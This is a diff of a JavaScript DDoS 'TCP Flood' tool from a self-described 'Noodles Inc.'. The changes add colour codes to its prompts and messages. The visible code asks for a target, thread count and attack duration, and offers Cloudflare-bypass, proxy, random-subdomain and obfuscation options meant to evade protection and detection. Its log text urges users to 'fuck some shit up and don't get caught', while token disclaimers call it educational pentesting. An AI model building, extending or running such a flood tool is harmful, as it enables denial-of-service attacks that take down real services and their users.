@@ -9,27 +9,28 @@
 // ******************************************************************************
 
 // Configuration - Let's fuck things up HARD!
-let targetURL = prompt("Enter target URL (including http/https/onion):");
+let targetURL = prompt(`${purple}Enter target URL (including http/https/onion):${resetColor}`);
 let targetHost;
 try {
     targetURL = new URL(targetURL);
     targetHost = targetURL.hostname;
 } catch (error) {
-    alert("Invalid URL! You fucked it up!");
+    alert(`${darkRed}Invalid URL! You fucked it up!${resetColor}`);
     window.close();
 }
 
-const port = parseInt(prompt("Enter target port (e.g., 80, 443, 8080):"));
-const threads = parseInt(prompt("Enter number of threads (crank it up to 666!):"));
-const duration = parseInt(prompt("Enter duration in seconds (let's go long term - FOREVER!):"));
+const port = parseInt(prompt(`${purple}Enter target port (e.g., 80, 443, 8080):${resetColor}`));
+const threads = parseInt(prompt(`${purple}Enter number of threads (crank it up to 666!):${resetColor}`));
+const duration = parseInt(prompt(`${purple}Enter duration in seconds (let's go long term - FOREVER!):${resetColor}`));
 const logFile = "ddos_fuck_log.txt"; // Log file name - keep track of the carnage
 let isRunning = false; // Track attack status
-let onionSupport = confirm("Do you want to enable .onion support? This requires a Tor proxy running locally. If you don't know what this is, you're fucked.");
-let cloudflareBypass = confirm("Attempt Cloudflare bypass? (May not always work, you dumbass!) Using more advanced techniques now, hope you're using good proxies!");
-let proxyListURL = prompt("Enter URL for proxy list (HTTP/SOCKS4/SOCKS5 - one proxy per line). Leave blank to skip and use direct connection (not recommended for Cloudflare bypass):");
-let useRandomSubdomains = confirm("Use random subdomains? (Helps bypass some DDoS protection).")
-let advancedObfuscation = confirm("Enable advanced payload obfuscation? (Might evade some detection systems, but can slow things down).");
-let autoAdjustThreads = confirm("Automatically adjust threads based on connection health? (experimental)");
+let onionSupport = confirm(`${darkPurple}Enable .onion support? Requires Tor proxy. Don't be a retard if you don't know what this is:${resetColor}`);
+let cloudflareBypass = confirm(`${darkPurple}Attempt Cloudflare bypass? (May not always work, you dumbass!) Using advanced techniques. Better have good proxies!${resetColor}`);
+let proxyListURL = prompt(`${purple}Enter URL for proxy list (HTTP/SOCKS4/SOCKS5 - one proxy per line). Leave blank to skip (not recommended for Cloudflare bypass):${resetColor}`);
+let useRandomSubdomains = confirm(`${darkPurple}Use random subdomains? (Helps bypass some DDoS protection. Smart, huh?)${resetColor}`);
+let advancedObfuscation = confirm(`${darkPurple}Enable advanced payload obfuscation? (Might evade some detection systems, but can slow things down. Your call.)${resetColor}`);
+let autoAdjustThreads = confirm(`${darkPurple}Automatically adjust threads based on connection health? (experimental, might make things worse. What the hell, let's try.)${resetColor}`);
+
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
 const purple = "\x1b[35m";
@@ -536,7 +537,7 @@ function adjustThreads() {
 // Disclaimer: Explicit user consent is required.
 function showConsent() {
     return new Promise((resolve, reject) => {
-        if (confirm("WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. NOODLES INC. is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)")) {
+        if (confirm(`${darkRed}WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. NOODLES INC. is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)${resetColor}`)) {
             resolve(true);
         } else {
             window.close();
@@ -593,7 +594,7 @@ stopButton.addEventListener('click', () => {
 });
 
 // Educational Information (Can be expanded in the UI) - who gives a shit?
-console.log("%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up and don't get caught, you dumbass! We've also added some Cloudflare bypass techniques - don't expect miracles.", "color: darkblue;");
+console.log(`%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up and don't get caught, you dumbass! We've also added some Cloudflare bypass techniques - don't expect miracles.`, "color: darkblue;");
 
 // Security Headers (Example - adapt as needed for the server environment) - yeah right, as if we care.
 // This would typically be set server-side, but for demonstration:
@@ -603,8 +604,8 @@ try {
     document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="X-Frame-Options" content="DENY">`);
     document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">`);
 } catch (e) {
-    console.warn("[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway. Just like your sorry ass when you get caught!");
+    console.warn(`%c[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway. Just like your sorry ass when you get caught!`, "color: orange;");
 }
 
 // Disclaimer for Noodles Inc.
-console.warn("%c[DISCLAIMER] NOODLES INC. IS NOT RESPONSIBLE FOR YOUR SHIT. YOU FUCK IT UP, YOU OWN IT. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. - DON'T BE A DUMBASS!", "color: darkred;");
+console.warn(`%c[DISCLAIMER] NOODLES INC. IS NOT RESPONSIBLE FOR YOUR SHIT. YOU FUCK IT UP, YOU OWN IT. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. - DON'T BE A DUMBASS!`, "color: darkred;");
